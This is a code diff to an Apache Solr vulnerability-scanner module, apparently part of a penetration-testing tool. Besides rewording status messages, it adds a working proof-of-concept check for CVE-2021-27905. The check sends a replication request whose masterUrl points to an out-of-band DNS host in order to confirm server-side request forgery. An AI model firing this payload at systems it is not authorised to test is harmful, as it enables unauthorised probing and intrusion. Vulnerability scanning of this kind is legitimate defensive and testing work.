@@ -10,6 +10,7 @@ from module.md5 import random_md5
 from module import globals
 from urllib.parse import urlparse, quote
 from thirdparty.requests_toolbelt.utils import dump
+from thirdparty.requests.compat import urljoin
 from module.api.dns import dns_result, dns_request
 
 
@@ -104,12 +105,12 @@ class ApacheSolr:
             if dns_result(md):
                 self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
-                self.vul_info["prt_info"] = "[dns] [new core:" + new_core + "] "
+                self.vul_info["prt_info"] = "[dns] [newcore: " + new_core + "] "
             else:
                 if request.status_code == 200 and core_name != "null" and core_name is not None:
                     self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
                     self.vul_info["prt_resu"] = "PoC_MaYbE"
-                    self.vul_info["prt_info"] = "[maybe] [new core:" + new_core + "] "
+                    self.vul_info["prt_info"] = "[maybe] [newcore: " + new_core + "] "
             verify.scan_print(self.vul_info)
         except requests.exceptions.Timeout:
             verify.timeout_print(self.vul_info["prt_name"])
@@ -207,7 +208,7 @@ class ApacheSolr:
             if request.status_code == 200 and core_name != "null":
                 self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoC_MaYbE"
-                self.vul_info["prt_info"] = "[maybe] [core name:" + url_cmd + "] "
+                self.vul_info["prt_info"] = "[maybe] [corename: " + url_cmd + "] "
                 verify.scan_print(self.vul_info)
             else:
                 verify.scan_print(self.vul_info)
@@ -394,3 +395,48 @@ class ApacheSolr:
             verify.connection_print(vul_name)
         except Exception:
             verify.error_print(vul_name)
+
+    def cve_2021_27905_poc(self):
+        self.threadLock.acquire()
+        self.vul_info["prt_name"] = "Apache Solr: CVE-2021-27905"
+        self.vul_info["prt_resu"] = "null"
+        self.vul_info["prt_info"] = "null"
+        self.vul_info["vul_urls"] = self.url
+        self.vul_info["vul_payd"] = "null"
+        self.vul_info["vul_name"] = "Apache Solr Replication handler SSRF"
+        self.vul_info["vul_numb"] = "CVE-2021-27905"
+        self.vul_info["vul_apps"] = "Solr"
+        self.vul_info["vul_date"] = "2021-04-14"
+        self.vul_info["vul_vers"] = "7.0.0-7.7.3, 8.0.0-8.8.1"
+        self.vul_info["vul_risk"] = "high"
+        self.vul_info["vul_type"] = "SSRF"
+        self.vul_info["vul_data"] = "null"
+        self.vul_info["vul_desc"] = "Apache Solr是一个开源搜索服务引擎，Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。漏洞产生在 ReplicationHandler 中的 masterUrl 参数（ leaderUrl 参数）可指派另一个 Solr 核心上的 ReplicationHandler 讲索引数据复制到本地核心上。成功利用此漏洞可造成服务端请求伪造漏洞。"
+        self.vul_info["cre_auth"] = "zhzyker"
+        core_name = None
+        dns = dns_request()
+        url_core = self.url + "/solr/admin/cores?indexInfo=false&wt=json"
+        try:
+            request = requests.get(url_core, headers=self.headers, timeout=self.timeout, verify=False)
+            try:
+                core_name = list(json.loads(request.text)["status"])[0]
+            except:
+                pass
+            payload = "/solr/re_core_name/replication?command=fetchindex&masterUrl" \
+                      "=http://re_dns_domain/&wt=json&httpBasicAuthUser=" \
+                      "&httpBasicAuthPassword=".replace("re_core_name", core_name).replace("re_dns_domain", dns)
+            url_ssrf = urljoin(self.url, payload)
+            r = requests.get(url_ssrf, headers=self.headers, timeout=self.timeout, verify=False)
+            if dns in dns_result(dns):
+                self.vul_info["vul_payd"] = url_ssrf
+                self.vul_info["vul_data"] = dump.dump_all(r).decode('utf-8', 'ignore')
+                self.vul_info["prt_resu"] = "PoCSuCCeSS"
+                self.vul_info["prt_info"] = "[ssrf] [dns] [corename: " + self.url + "/solr/" + core_name + " ]"
+            verify.scan_print(self.vul_info)
+        except requests.exceptions.Timeout:
+            verify.timeout_print(self.vul_info["prt_name"])
+        except requests.exceptions.ConnectionError:
+            verify.connection_print(self.vul_info["prt_name"])
+        except Exception as e:
+            verify.error_print(self.vul_info["prt_name"])
+        self.threadLock.release()
